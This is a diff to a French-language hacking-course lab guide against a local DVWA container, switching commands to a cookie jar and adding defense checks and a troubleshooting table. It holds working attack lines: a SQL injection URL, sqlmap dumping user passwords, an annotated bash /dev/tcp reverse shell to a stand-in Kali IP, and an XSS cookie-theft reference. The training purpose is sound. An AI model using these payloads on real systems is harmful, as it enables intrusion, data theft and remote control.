@@ -346,6 +346,14 @@ curl -s -c /tmp/dvwa_cookie.txt \
 # → Welcome  (authentification réussie, le cookie est stocké dans /tmp/dvwa_cookie.txt)
 
 # Firefox : http://localhost:8088 → DVWA Security → low
+
+# Alternative sans navigateur : définir le niveau de sécurité directement via curl
+# -b lit le cookie d'authentification, -c met à jour le fichier avec le nouveau cookie security=low
+curl -s -b /tmp/dvwa_cookie.txt -c /tmp/dvwa_cookie.txt \
+  -d "security=low&seclev_submit=Submit" \
+  "http://localhost:8088/security.php"
+# Le cookie jar contient maintenant PHPSESSID + security=low
+# Plus besoin d'ouvrir Firefox pour les labs suivants
 ```
 
 ### Checkpoints
@@ -440,8 +448,12 @@ docker exec dvwa-target bash -c "
   echo 'session.cookie_httponly = 1' >> /etc/php/*/apache2/php.ini
   apache2ctl restart
 "
+# Vérification : le fichier php.ini contient bien la directive HttpOnly
+docker exec dvwa-target bash -c "grep 'session.cookie_httponly' /etc/php/*/apache2/php.ini"
+# → session.cookie_httponly = 1  (confirmé)
+
 # Re-tester le vol de cookie via XSS : le payload <script>new Image().src=... ne peut plus lire document.cookie
-curl -s -b "PHPSESSID=XXXX;security=low" \
+curl -s -b /tmp/dvwa_cookie.txt \
   "http://localhost:8088/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E" 2>/dev/null \
   | grep -o "&lt;script&gt;\|alert"
 # → &lt;script&gt;alert(1)&lt;/script&gt;  (le code HTML est échappé, pas exécuté par le navigateur)
@@ -465,13 +477,13 @@ La requête `SELECT first_name, last_name FROM users WHERE user_id = '$id'` devi
 
 ### Étape 1 — Test manuel
 
-**Important :** remplacez `XXXX` par votre PHPSESSID. Pour l'obtenir : Firefox → DVWA → F12 → Storage → Cookies → copier la valeur de `PHPSESSID`.
+**Important :** utilisez le cookie jar sauvegardé précédemment dans `/tmp/dvwa_cookie.txt`. Il contient déjà votre PHPSESSID et le niveau `security=low` (définis au Lab 1.1).
 
 ```bash
-# Test manuel d'injection SQL : -b envoie le cookie PHPSESSID (authentification) + security=low (niveau de sécurité DVWA)
+# Test manuel d'injection SQL : -b lit le cookie depuis le fichier jar (PHPSESSID + security=low inclus)
 # L'URL contient ' OR '1'='1' # encodé en URL (%27 = ', %20 = espace, %3D = =, %23 = #)
 # grep -c compte les occurrences de "First name" → doit retourner 5 (tous les users) au lieu de 1
-curl -s -b "PHPSESSID=XXXX;security=low" \
+curl -s -b /tmp/dvwa_cookie.txt \
   "http://localhost:8088/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+%23&Submit=Submit" \
   | grep -c "First name"
 # → 5 (5 utilisateurs affichés au lieu d'1)  (injection SQL confirmée : tous les enregistrements sont retournés)
@@ -481,12 +493,12 @@ curl -s -b "PHPSESSID=XXXX;security=low" \
 
 ```bash
 cd ~/cours-hacking/jour-1/labs
-# Remplacer XXXX par le PHPSESSID (Firefox → F12 → Storage → Cookies)
 
-# sqlmap : -u = URL cible, --cookie = cookie de session pour l'authentification, -D = base de données cible (dvwa)
-# -T users = table cible, -C user,password = colonnes à extraire, --dump = affiche le contenu, --batch = mode non-interactif
+# sqlmap : --cookie-file = charge les cookies depuis le fichier jar au format Netscape (PHPSESSID + security=low)
+# -u = URL cible, -D = base de données cible (dvwa), -T users = table cible
+# -C user,password = colonnes à extraire, --dump = affiche le contenu, --batch = mode non-interactif
 sqlmap -u "http://localhost:8088/vulnerabilities/sqli/?id=1&Submit=Submit" \
-  --cookie="PHPSESSID=XXXX;security=low" \
+  --cookie-file=/tmp/dvwa_cookie.txt \
   -D dvwa -T users -C user,password --dump --batch
 ```
 Sortie attendue :
@@ -525,7 +537,7 @@ L'injection SQL se corrige en **ne concaténant jamais l'entrée utilisateur dan
 #   $stmt->execute([$id]);
 # 
 # Re-tester sqlmap après correction :
-# sqlmap -u "http://localhost:8088/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=XXXX;security=low" --batch
+# sqlmap -u "http://localhost:8088/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie-file=/tmp/dvwa_cookie.txt --batch
 # → [CRITICAL] all tested parameters do not appear to be injectable (sqlmap échoue = défense efficace)
 ```
 
@@ -574,8 +586,14 @@ ip addr show docker0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
 # → généralement 172.17.0.1  (c'est l'IP que les conteneurs utilisent pour joindre l'hôte Kali)
 
 # Payload dans DVWA Command Injection :
-# bash -c exécute la chaîne comme commande, bash -i = mode interactif, >& /dev/tcp/IP/PORT = redirige stdin/stdout vers la socket TCP
-127.0.0.1; bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'  # Ouvre un shell inversé vers l'écouteur Kali
+# Décorticage de la commande de reverse shell (morceau par morceau) :
+#   1. 127.0.0.1;          → ping localhost (normal), puis le ; enchaîne la 2e commande
+#   2. bash -c '...'        → exécute la chaîne entre guillemets dans un sous-shell bash dédié
+#   3. bash -i               → lance un shell bash interactif (avec invite de commandes, historique)
+#   4. >& /dev/tcp/IP/PORT   → redirige stdout (sortie) ET stderr (erreurs) vers la socket TCP distante
+#   5. 0>&1                  → redirige stdin (entrée clavier) vers la même socket
+#   Résultat : votre terminal local est connecté à distance au serveur → shell complet
+127.0.0.1; bash -c 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1'
 ```
 
 **Checkpoint :** Retournez dans le **Terminal 1** (netcat) : une connexion entrante apparaît, suivie d'un prompt shell. Tapez `whoami` → `www-data`.
@@ -597,13 +615,22 @@ docker exec dvwa-target bash -c "
   sed -i 's/disable_functions =.*/disable_functions = system,exec,passthru,shell_exec,popen,proc_open/' /etc/php/*/apache2/php.ini
   apache2ctl restart
 "
+# Vérification : shell_exec est-il bien désactivé ?
+docker exec dvwa-target bash -c "php -r 'echo function_exists(\"shell_exec\") ? \"actif\" : \"inactif\";'"
+# → inactif  (shell_exec est bien désactivé)
+
 # Re-tester l'injection de commande :
 curl -s "http://localhost:8088/vulnerabilities/exec/" --data "ip=127.0.0.1;whoami&Submit=Submit" \
-  -b "PHPSESSID=XXXX;security=low" 2>/dev/null | grep -c "www-data"
+  -b /tmp/dvwa_cookie.txt 2>/dev/null | grep -c "www-data"
 # → 0 (whoami ne s'exécute plus : shell_exec est désactivé)
 ```
 
 > **Checkpoint défensif :** Après `disable_functions`, l'injection de commande et le reverse shell échouent.
+
+> **☕ Pause recommandée :** Le Lab 1.5 ci-dessous est le plus long et le plus dense de la journée.
+> Prenez 5-10 minutes avant de l'attaquer — vous allez enchaîner injection SQL sur 3 points d'entrée,
+> extraction automatisée avec sqlmap, et cracking de mots de passe. Un esprit reposé est plus efficace
+> pour analyser les résultats.
 
 ---
 
@@ -916,6 +943,20 @@ sqlmap -u "http://localhost:8083/?page=search&id=1" --batch 2>&1 | grep -i "inje
 </details>
 
 ---
+
+## Dépannage rapide
+
+| Problème | Cause probable | Solution |
+|---|---|---|
+| `curl: (56) Recv failure: Connection reset` | Conteneur pas encore prêt | `docker compose logs dvwa` pour voir l'avancement, attendre quelques secondes |
+| `curl: (7) Failed to connect` | Conteneur non démarré | `docker compose ps` pour vérifier l'état, `docker compose up -d` pour relancer |
+| Connexion DVWA : "Login failed" | Session expirée ou cookie corrompu | Relancer : `curl -s -c /tmp/dvwa_cookie.txt -d "username=admin&password=password&Login=Login" "http://localhost:8088/login.php"` |
+| `sqlmap` ne trouve aucun paramètre injectable | Cookie invalide ou `security` != low | Vérifier `/tmp/dvwa_cookie.txt` avec `cat /tmp/dvwa_cookie.txt` — doit contenir `security=low` |
+| Reverse shell ne se connecte pas | Mauvaise IP ou firewall bloque | `ip addr show docker0` pour trouver l'IP hôte ; `sudo ufw disable` si le firewall local bloque |
+| Reverse shell : connexion refusée | Écouteur nc pas lancé | Lancer d'abord `nc -lvnp 4444` **dans un terminal séparé**, **avant** le payload |
+| `docker: permission denied` | Utilisateur pas dans le groupe docker | `sudo usermod -aG docker $USER` puis **fermer/rouvrir** la session |
+| Port déjà utilisé (8088, 8083...) | Conflit avec service local | `sudo lsof -i :8088` pour identifier le processus, `sudo systemctl stop <service>` |
+| `grep: 5` au lieu de `→ 5` | Sortie attendue non formatée | C'est normal — seul le chiffre compte (le commentaire `→` n'est pas produit par grep) |
 
 ## Points clés à retenir
 
